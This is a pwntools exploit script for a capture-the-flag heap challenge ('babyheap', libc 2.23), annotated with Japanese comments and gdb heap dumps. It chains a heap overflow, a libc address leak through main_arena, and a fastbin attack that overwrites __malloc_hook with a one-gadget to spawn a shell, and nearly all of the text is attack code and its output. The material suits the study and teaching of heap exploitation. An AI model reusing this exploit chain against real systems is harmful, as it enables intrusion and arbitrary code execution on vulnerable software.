#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./babyheap")
gdb.attach(target, gdbscript="b free")
elf = ELF("libc-2.23.so")

def alloc(size):
    target.recvuntil("Command: ")
    target.sendline("1")
    target.recvuntil("Size: ")
    target.sendline(str(size))

def free(index):
    target.recvuntil("Command: ")
    target.sendline("3")
    target.recvuntil("Index: ")
    target.sendline(str(index))

def fill(index, size, content):
    target.recvuntil("Command: ")
    target.sendline("2")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Size: ")
    target.sendline(str(size))
    target.recvuntil("Content: ")
    target.sendline(content)

def dump(index):
    target.recvline("Command: ")
    target.sendline("4")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Content: \n")
    leak = target.recvline()
    return leak

alloc(0xf0)
alloc(0x70)
alloc(0xf0)
alloc(0x30)
fill(0, 0xf0, b"0" * 0xf0)
fill(1, 0x70, b"1" * 0x70)
fill(2, 0xf0, b"2" * 0xf0)
fill(3, 0x30, b"3" * 0x30)

free(0)
free(1)
#[0, 1, 2, 3] → [ , , 2, 3]
"""
heap bin
Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x55c09c590110, size=0x80, flags=! PREV_INUSE)
─────────────────────────────────────── Unsorted Bin for arena at 0x7efdc7cdfb20 ───────────────────────────────────────
[+] unsorted_bins[0]: fw=0x55c09c590000, bk=0x55c09c590000
 →   Chunk(addr=0x55c09c590010, size=0x100, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.

chunk
0x55c09c590000: 0x00000000      0x00000000      0x00000101      0x00000000 ← index 0
0x55c09c590010: 0xc7cdfb78      0x00007efd      0xc7cdfb78      0x00007efd
0x55c09c590020: 0x30303030      0x30303030      0x30303030      0x30303030
[中略]
0x55c09c5900f0: 0x30303030      0x30303030      0x30303030      0x30303030
0x55c09c590100: 0x00000100      0x00000000      0x00000080      0x00000000 ← index 1
0x55c09c590110: 0x00000000      0x00000000      0x31313131      0x31313131

main_arena
0x7efdc7cdfb50 <main_arena+48>: 0x00000000 0x00000000 0x9c590100 0x000055c0 ← index 1
0x7efdc7cdfb60 <main_arena+64>: 0x00000000 0x00000000 0x00000000 0x00000000
0x7efdc7cdfb70 <main_arena+80>: 0x00000000 0x00000000 0x9c5902c0 0x000055c0 ← 右はtopのアドレス
0x7efdc7cdfb80 <main_arena+96>: 0x00000000 0x00000000 0x9c590000 0x000055c0 ← 0の格納しているarenaと同じ
"""

#後入れ先出しなので後に開放したindex 1(0x55c09c590110[0x70])が割り当てられる
alloc(0x78)
#[ , , 2, 3] → [0, , 2, 3]
"""
heap bin
[+] unsorted_bins[0]: fw=0x55c09c590000, bk=0x55c09c590000 ← index 0になった
 →   Chunk(addr=0x55c09c590010, size=0x100, flags=PREV_INUSE)

chunk 
0x55c09c5900f0: 0x30303030 0x30303030 0x30303030 0x30303030
0x55c09c590100: 0x00000100 0x00000000 0x00000080 0x00000000 ← 直前のindex1は未使用なので0x80 後直前のサイズ
0x55c09c590110: 0x00000000 0x00000000 0x00000000 0x00000000   callocは割り当ての際に初期化される

main_arena
0x7efdc7cdfb50 <main_arena+48>: 0x00000000      0x00000000      0x00000000      0x00000000 
0x7efdc7cdfb60 <main_arena+64>: 0x00000000      0x00000000      0x00000000      0x00000000
0x7efdc7cdfb70 <main_arena+80>: 0x00000000      0x00000000      0x9c5902c0      0x000055c0 
0x7efdc7cdfb80 <main_arena+96>: 0x00000000      0x00000000      0x9c590000      0x000055c0 
"""

#alloc(0x78)にindex0が割り当てられるので,ここで編集されるのは最初に作ったチャンクではない
#最初に作ったチャンクはfree時点でリセットされている
fill(0, 128, b"4" * 0x70 + p64(0x180) + p64(0x100))
"""
0x55c09c590000: 0x00000000      0x00000000      0x00000101      0x00000000 ← 最初に作ったindex 0(free済み)
0x55c09c590010: 0xc7cdfb78      0x00007efd      0xc7cdfb78      0x00007efd
0x55c09c590020: 0x30303030      0x30303030      0x30303030      0x30303030
[中略]
0x55c09c5900f0: 0x30303030      0x30303030      0x30303030      0x30303030
0x55c09c590100: 0x00000100      0x00000000      0x00000080      0x00000000 ← 編集するのはここ(今のindex 0 元index 1)
0x55c09c590110: 0x34343434      0x34343434      0x34343434      0x34343434
[中略]
0x55c09c590170: 0x34343434      0x34343434      0x34343434      0x34343434
0x55c09c590180: 0x00000180      0x00000000      0x00000100      0x00000000 ← 上書きされたindex 2 

[参考までにオーバーフロー前のチャンク]
0x55c09c590170: 0x00000000      0x00000000      0x00000000      0x00000000
0x55c09c590180: 0x00000000      0x00000000      0x00000101      0x00000000
"""

free(2)
#[0, , 2, 3] → [0, , , 3]
"""
free前
0x55c09c590000: 0x00000000      0x00000000      0x00000101      0x00000000 ← 元index 0
0x55c09c590010: 0xc7cdfb78      0x00007efd      0xc7cdfb78      0x00007efd
0x55c09c590020: 0x30303030      0x30303030      0x30303030      0x30303030
[略]
0x55c09c5900f0: 0x30303030      0x30303030      0x30303030      0x30303030
0x55c09c590100: 0x00000100      0x00000000      0x00000080      0x00000000 ← 今のindex0 元index 1
0x55c09c590110: 0x34343434      0x34343434      0x34343434      0x34343434
[略]
0x55c09c590170: 0x34343434      0x34343434      0x34343434      0x34343434
0x55c09c590180: 0x00000180      0x00000000      0x00000100      0x00000000
0x55c09c590190: 0x32323232      0x32323232      0x32323232      0x32323232 ← index 2 ここをfreeする
[略]
0x55c09c590270: 0x32323232      0x32323232      0x32323232      0x32323232
0x55c09c590280: 0x00000000      0x00000000      0x00000041      0x00000000
0x55c09c590290: 0x33333333      0x33333333      0x33333333      0x33333333 ← index 3
[略]
0x55c09c5902b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x55c09c5902c0: 0x00000000      0x00000000      0x00020d41      0x00000000

free後
0x55c09c590000: 0x00000000      0x00000000      0x00000281      0x00000000
0x55c09c590010: 0xc7cdfb78      0x00007efd      0xc7cdfb78      0x00007efd
0x55c09c590020: 0x30303030      0x30303030      0x30303030      0x30303030
[中略]
0x55c09c5900f0: 0x30303030      0x30303030      0x30303030      0x30303030
0x55c09c590100: 0x00000100      0x00000000      0x00000080      0x00000000 ← 今のindex0
0x55c09c590110: 0x34343434      0x34343434      0x34343434      0x34343434
[中略]
0x55c09c590170: 0x34343434      0x34343434      0x34343434      0x34343434
0x55c09c590180: 0x00000180      0x00000000      0x00000100      0x00000000
0x55c09c590190: 0x32323232      0x32323232      0x32323232      0x32323232 ← 元 index 2 
[中略]                                                                       前のサイズ0x180と合わせて0x280が開放
0x55c09c590270: 0x32323232      0x32323232      0x32323232      0x32323232
0x55c09c590280: 0x00000280      0x00000000      0x00000040      0x00000000
0x55c09c590290: 0x33333333      0x33333333      0x33333333      0x33333333 ← index 3
[中略]
0x55c09c5902b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x55c09c5902c0: 0x00000000      0x00000000      0x00020d41      0x00000000

heap bin
[+] unsorted_bins[0]: fw=0x55c09c590000, bk=0x55c09c590000
 →   Chunk(addr=0x55c09c590010, size=0x280, flags=PREV_INUSE)

 
今オーバーフローを利用してfreeした元index 0のチャンクを0x280に偽造している
ここで0xf0で割り当てを行うと,0xf0分割り当てが行われ,ちょうど今のindex0の位置にmain_arenaのアドレスが来る

0x557ec8df4000: 0x00000000      0x00000000      0x00000101      0x00000000
0x557ec8df4010: 0x00000000      0x00000000      0x00000000      0x00000000
[略]
0x557ec8df4100: 0x00000000      0x00000000      0x00000181      0x00000000
0x557ec8df4110: 0xde2cfb78      0x00007f39      0xde2cfb78      0x00007f39 ← 今のindex0 freeしてないのにarenaが書き込まれる
"""
alloc(0xf0)
fill(1, 0xf0, b"5" * 0xf0)
#[0, , , 3] →　[0, 1, , 3]

arena = u64(dump(0)[0:8])
"""
mallochookはarenaの上にある
今回はPIEがオンなのでmalloc_hookは相対値になる
つまりleakされたarenaからちょうど上にあるmalloc_hookの値を引くとlibcになる
-0x68はarenaとmalloc_hookの差

main_arenaは+88の位置
0x7f5c7bcc7b10 <__malloc_hook>: 0x00000000      0x00000000      0x00000000      0x00000000
0x7f5c7bcc7b20 <main_arena>:    0x00000000      0x00000000      0x00000000      0x00000000
"""
libc        = arena - elf.symbols["__malloc_hook"] - 0x68
shot        = libc + 0x4526a
malloc_hook = libc + elf.symbols["__malloc_hook"]
free_hook   = libc + elf.symbols["__free_hook"]
fake_chunk  = malloc_hook - 0x23

print("[*]libc       : ", hex(libc))
print("[*]shot       : ", hex(shot))
print("[*]malloc_hook: ", hex(malloc_hook))
print("[*]free_hook  : ", hex(free_hook))
print("[*]fake_chunk : ", hex(fake_chunk))

free(1)
#[0, 1, , 3] → [0, , , 3]
"""
0x5620081ea000: 0x00000000      0x00000000      0x00000101      0x00000000 ← ここがindex 1
0x5620081ea010: 0x35353535      0x35353535      0x35353535      0x35353535
[略]
0x5620081ea0f0: 0x35353535      0x35353535      0x35353535      0x35353535
0x5620081ea100: 0x00000000      0x00000000      0x00000181      0x00000000 ← index0
0x5620081ea110: 0x7bcc7b78      0x00007f5c      0x7bcc7b78      0x00007f5c
0x5620081ea120: 0x34343434      0x34343434      0x34343434      0x34343434
[略]
0x5620081ea170: 0x34343434      0x34343434      0x34343434      0x34343434
0x5620081ea180: 0x00000180      0x00000000      0x00000100      0x00000000
0x5620081ea190: 0x32323232      0x32323232      0x32323232      0x32323232
[略]
0x5620081ea270: 0x32323232      0x32323232      0x32323232      0x32323232
0x5620081ea280: 0x00000180      0x00000000      0x00000040      0x00000000 ← index 3
0x5620081ea290: 0x33333333      0x33333333      0x33333333      0x33333333
0x5620081ea2a0: 0x33333333      0x33333333      0x33333333      0x33333333
0x5620081ea2b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x5620081ea2c0: 0x00000000      0x00000000      0x00020d41      0x00000000

free後
0x5620081ea000: 0x00000000      0x00000000      0x00000281      0x00000000 ← サイズ自体は0x280なので元に戻る
0x5620081ea010: 0x7bcc7b78      0x00007f5c      0x7bcc7b78      0x00007f5c
0x5620081ea020: 0x35353535      0x35353535      0x35353535      0x35353535
"""

#index 0と3が残っている
alloc(0x10)
alloc(0x60)
alloc(0x60)
alloc(0x60)
#[0, , , 3] → [0, 1, 2, 3, 4, 5]
"""
0x562e395b3000: 0x00000000      0x00000000      0x00000021      0x00000000 ← index 1
0x562e395b3010: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3020: 0x00000000      0x00000000      0x00000071      0x00000000 ← index 2
[略]
0x562e395b3080: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3090: 0x00000000      0x00000000      0x00000071      0x00000000 ← index 4
[略]
0x562e395b3100: 0x00000000      0x00000000      0x00000071      0x00000000 ← index 5
[略]
0x562e395b3170: 0x00000000      0x00000000      0x00000111      0x00000000 ← index0
0x562e395b3180: 0x2eca4b78      0x00007f90      0x2eca4b78      0x00007f90
0x562e395b3190: 0x32323232      0x32323232      0x32323232      0x32323232
[略]
0x562e395b3270: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3280: 0x00000110      0x00000000      0x00000040      0x00000000 ← index 3
0x562e395b3290: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32a0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32c0: 0x00000000      0x00000000      0x00020d41      0x00000000

[+] unsorted_bins[0]: fw=0x562e395b3170, bk=0x562e395b3170
 →   Chunk(addr=0x562e395b3180, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
"""

free(5)
free(4)
free(0)
#[0, 1, 2, 3, 4, 5] → [, 1, 2, 3, , ]
"""
0x562e395b3000: 0x00000000      0x00000000      0x00000021      0x00000000
0x562e395b3010: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3020: 0x00000000      0x00000000      0x00000071      0x00000000
[略]
0x562e395b3090: 0x00000000      0x00000000      0x00000071      0x00000000 ← 元index 4
0x562e395b30a0: 0x395b3100      0x0000562e      0x00000000      0x00000000
[略]
0x562e395b3100: 0x00000000      0x00000000      0x00000071      0x00000000 ← 元index 5
0x562e395b3110: 0x395b3090      0x0000562e      0x00000000      0x00000000
[略]
0x562e395b3170: 0x00000000      0x00000000      0x00000111      0x00000000 ← 元index0
0x562e395b3180: 0x2eca4b78      0x00007f90      0x2eca4b78      0x00007f90
0x562e395b3190: 0x32323232      0x32323232      0x32323232      0x32323232
[略]
0x562e395b3270: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3280: 0x00000110      0x00000000      0x00000040      0x00000000
0x562e395b3290: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32a0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32c0: 0x00000000      0x00000000      0x00020d41      0x00000000

Fastbins[idx=5, size=0x70]  
←  Chunk(addr=0x562e395b3110, size=0x70, flags=PREV_INUSE)  5
←  Chunk(addr=0x562e395b30a0, size=0x70, flags=PREV_INUSE)  4
←  Chunk(addr=0x562e395b3110, size=0x70, flags=PREV_INUSE)  →  [loop detected]
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────── Unsorted Bin for arena at 0x7f902eca4b20 ───────────────────────────────────────
[+] unsorted_bins[0]: fw=0x562e395b3170, bk=0x562e395b3170
 →   Chunk(addr=0x562e395b3180, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.


0x7f902eca4b78 <main_arena+88>:         0x395b32c0      0x0000562e      0x395b3170      0x0000562e
0x7f902eca4b88 <main_arena+104>:        0x395b3170      0x0000562e      0x395b3170      0x0000562e

"""

alloc(0x60)
alloc(0x60)
#[, 1, 2, 3, , ] → [0, 1, 2, 3, 4, ]
fill(0, 0x60, p64(fake_chunk) + p64(0) + b"y" * 0x50)
"""
0x562e395b3000: 0x00000000      0x00000000      0x00000021      0x00000000
0x562e395b3010: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3020: 0x00000000      0x00000000      0x00000071      0x00000000
0x562e395b3030: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3040: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3050: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3060: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3070: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3080: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3090: 0x00000000      0x00000000      0x00000071      0x00000000
0x562e395b30a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b30b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b30c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b30d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b30e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b30f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3100: 0x00000000      0x00000000      0x00000071      0x00000000
0x562e395b3110: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3120: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3130: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3140: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3150: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3160: 0x00000000      0x00000000      0x00000000      0x00000000
0x562e395b3170: 0x00000000      0x00000000      0x00000111      0x00000000
0x562e395b3180: 0x2eca4b78      0x00007f90      0x2eca4b78      0x00007f90
0x562e395b3190: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31a0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31b0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31c0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31d0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31e0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b31f0: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3200: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3210: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3220: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3230: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3240: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3250: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3260: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3270: 0x32323232      0x32323232      0x32323232      0x32323232
0x562e395b3280: 0x00000110      0x00000000      0x00000040      0x00000000
0x562e395b3290: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32a0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32b0: 0x33333333      0x33333333      0x33333333      0x33333333
0x562e395b32c0: 0x00000000      0x00000000      0x00020d41      0x00000000

Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x562e395b3110, size=0x70, flags=PREV_INUSE)
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────── Unsorted Bin for arena at 0x7f902eca4b20 ───────────────────────────────────────
[+] unsorted_bins[0]: fw=0x562e395b3170, bk=0x562e395b3170
 →   Chunk(addr=0x562e395b3180, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
"""
alloc(0x60)
#[0, 1, 2, 3, 4, ] → [0, 1, 2, 3, 4, 5]

alloc(0x60)
#[0, 1, 2, 3, 4, 5] → [0, 1, 2, 3, 4, 5, 6]
"""

"""

fill(6, 0x1b, b"z"* 0x13 + p64(shot))
"""

"""

target.sendline("1\n1\n")
target.recvuntil("Size: ")

target.interactive()